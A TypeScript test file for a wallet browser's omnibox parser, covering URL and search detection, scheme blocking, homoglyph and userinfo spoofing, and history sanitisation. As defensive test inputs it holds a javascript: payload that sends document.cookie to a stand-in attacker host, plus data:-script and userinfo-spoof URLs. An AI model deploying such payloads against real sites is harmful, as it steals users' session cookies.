import { describe, expect, it } from "vitest";
import {
  displayHost,
  isNavigableHost,
  isSpoofRiskHost,
  type OmniboxIntent,
  parseOmnibox,
  parseUrl,
  securityLevel,
  toHistoryUrl,
} from "./omnibox";

/** Narrowing helpers so each assertion reads as one line. */
const url = (input: string): Extract<OmniboxIntent, { kind: "url" }> => {
  const intent = parseOmnibox(input);
  expect(intent?.kind, `expected "${input}" to be a URL`).toBe("url");
  return intent as Extract<OmniboxIntent, { kind: "url" }>;
};

const search = (input: string): Extract<OmniboxIntent, { kind: "search" }> => {
  const intent = parseOmnibox(input);
  expect(intent?.kind, `expected "${input}" to be a search`).toBe("search");
  return intent as Extract<OmniboxIntent, { kind: "search" }>;
};

describe("parseOmnibox — sites", () => {
  it("navigates a bare hostname", () => {
    expect(url("jup.ag").url).toBe("https://jup.ag");
    expect(url("jup.ag").host).toBe("jup.ag");
  });

  it("keeps path, query and fragment intact", () => {
    expect(url("app.uniswap.org/swap?chain=base#x").url).toBe(
      "https://app.uniswap.org/swap?chain=base#x",
    );
  });

  it("passes an explicit https URL through unchanged", () => {
    expect(url("https://jup.ag/perps").url).toBe("https://jup.ag/perps");
  });

  it("lowercases the host but not the path", () => {
    const intent = url("https://JUP.AG/Perps");
    expect(intent.host).toBe("jup.ag");
    expect(intent.url).toBe("https://jup.ag/Perps");
  });

  it("keeps an explicit port", () => {
    expect(url("example.com:8443/app").url).toBe(
      "https://example.com:8443/app",
    );
  });

  it("accepts an IPv4 literal", () => {
    expect(url("192.168.1.10/app").url).toBe("https://192.168.1.10/app");
  });

  it("drops a trailing dot from the host", () => {
    expect(url("jup.ag./x").host).toBe("jup.ag");
  });
});

describe("parseOmnibox — searches", () => {
  it("returns null for empty or whitespace-only input", () => {
    expect(parseOmnibox("")).toBeNull();
    expect(parseOmnibox("   ")).toBeNull();
    expect(parseOmnibox("\n\t")).toBeNull();
  });

  it("searches anything containing a space", () => {
    expect(search("best solana dex").query).toBe("best solana dex");
    // The old heuristic navigated to https://jup.ag with the rest dropped.
    expect(search("jup.ag swap sol").kind).toBe("search");
  });

  it("searches a single word with no dot", () => {
    expect(search("uniswap").url).toBe("https://duckduckgo.com/?q=uniswap");
  });

  it("percent-encodes the query", () => {
    expect(search("a&b c").url).toBe("https://duckduckgo.com/?q=a%26b%20c");
  });

  it("searches numbers that merely look like hosts", () => {
    // The old `input.includes(".")` test sent every one of these to
    // https://<number>, which dead-ended on a DNS failure.
    for (const input of ["1.5", "0.01", "3.14159", "2.0"]) {
      expect(search(input).kind, input).toBe("search");
    }
  });

  it("searches a version-like token", () => {
    expect(search("v2.0").kind).toBe("search");
  });
});

describe("parseOmnibox — scheme safety", () => {
  it("never navigates javascript:", () => {
    const intent = search("javascript:fetch('//evil.co/'+document.cookie)");
    expect(intent.url.startsWith("https://duckduckgo.com/?q=")).toBe(true);
  });

  it("never navigates data:, file:, about: or intent:", () => {
    expect(search("data:text/html,<script>alert(1)</script>").kind).toBe(
      "search",
    );
    expect(search("file:///etc/hosts").kind).toBe("search");
    expect(search("about:blank").kind).toBe("search");
    expect(search("intent://scan#Intent;scheme=zxing;end").kind).toBe("search");
  });

  it("upgrades http to https rather than dead-ending", () => {
    // originWhitelist is https-only, and react-native-webview hands
    // anything it rejects to Linking.openURL — so an un-upgraded http URL
    // ejected the user into the system browser.
    const intent = url("http://jup.ag/x");
    expect(intent.url).toBe("https://jup.ag/x");
    expect(intent.upgraded).toBe(true);
  });

  it("reads a host:port as a host, not as a scheme", () => {
    expect(url("localhost.dev:3000").host).toBe("localhost.dev");
  });
});

describe("parseOmnibox — spoofing defences", () => {
  it("strips userinfo so the bar shows the real host", () => {
    const intent = url("https://app.uniswap.org@evil.example/claim");
    expect(intent.host).toBe("evil.example");
    expect(intent.url).toBe("https://evil.example/claim");
    expect(intent.strippedCredentials).toBe(true);
  });

  it("strips credentials with a password too", () => {
    expect(url("https://user:pass@evil.example").host).toBe("evil.example");
  });

  it("strips zero-width and bidi characters before parsing", () => {
    // U+200B between the labels; renders as "jup.ag" but is a different host.
    expect(url("jup​.ag").host).toBe("jup.ag");
    expect(url("‮jup.ag‬").host).toBe("jup.ag");
  });

  it("strips tabs and newlines from a pasted URL", () => {
    expect(url("https://jup.ag\n").url).toBe("https://jup.ag");
  });

  it("flags non-ASCII and punycode hosts as a spoof risk", () => {
    // Cyrillic "а" in place of the Latin one.
    expect(isSpoofRiskHost("аpp.uniswap.org")).toBe(true);
    expect(isSpoofRiskHost("xn--pp-uniswap-a1a.org")).toBe(true);
    expect(isSpoofRiskHost("app.uniswap.org")).toBe(false);
  });
});

describe("isNavigableHost", () => {
  it("requires an alphabetic TLD of at least two characters", () => {
    expect(isNavigableHost("jup.ag")).toBe(true);
    expect(isNavigableHost("jup.a")).toBe(false);
    expect(isNavigableHost("jup.5")).toBe(false);
  });

  it("rejects hosts with no dot", () => {
    expect(isNavigableHost("uniswap")).toBe(false);
  });

  it("rejects labels that start or end with a hyphen", () => {
    expect(isNavigableHost("-bad.com")).toBe(false);
    expect(isNavigableHost("bad-.com")).toBe(false);
  });

  it("rejects a host over the DNS length limit", () => {
    expect(isNavigableHost(`${"a".repeat(250)}.com`)).toBe(false);
  });
});

describe("parseUrl / display helpers", () => {
  it("parses a committed URL into its parts", () => {
    const parsed = parseUrl("https://app.uniswap.org:443/swap?a=1#b");
    expect(parsed).toMatchObject({
      scheme: "https",
      host: "app.uniswap.org",
      port: "443",
      rest: "/swap?a=1#b",
      isSecure: true,
      isSpoofRisk: false,
    });
  });

  it("returns null for input with no scheme", () => {
    expect(parseUrl("jup.ag")).toBeNull();
    expect(parseUrl("")).toBeNull();
  });

  it("drops the www prefix for display", () => {
    expect(displayHost("https://www.jup.ag/perps")).toBe("jup.ag");
    expect(displayHost("https://jup.ag")).toBe("jup.ag");
    expect(displayHost("not a url")).toBe("");
  });

  it("grades the security chip", () => {
    expect(securityLevel("")).toBe("none");
    expect(securityLevel("https://jup.ag")).toBe("secure");
    expect(securityLevel("http://jup.ag")).toBe("insecure");
    expect(securityLevel("https://аpp.uniswap.org")).toBe("caution");
  });
});

describe("toHistoryUrl", () => {
  it("keeps the path but drops query and fragment", () => {
    // Those carry session tokens, referral codes and wallet addresses.
    expect(toHistoryUrl("https://app.uniswap.org/swap?token=SECRET#x")).toBe(
      "https://app.uniswap.org/swap",
    );
  });

  it("normalises a bare root to the origin", () => {
    expect(toHistoryUrl("https://jup.ag/")).toBe("https://jup.ag");
  });

  it("refuses to record anything that is not https", () => {
    expect(toHistoryUrl("http://jup.ag")).toBeNull();
    expect(toHistoryUrl("about:blank")).toBeNull();
    expect(toHistoryUrl("")).toBeNull();
  });
});
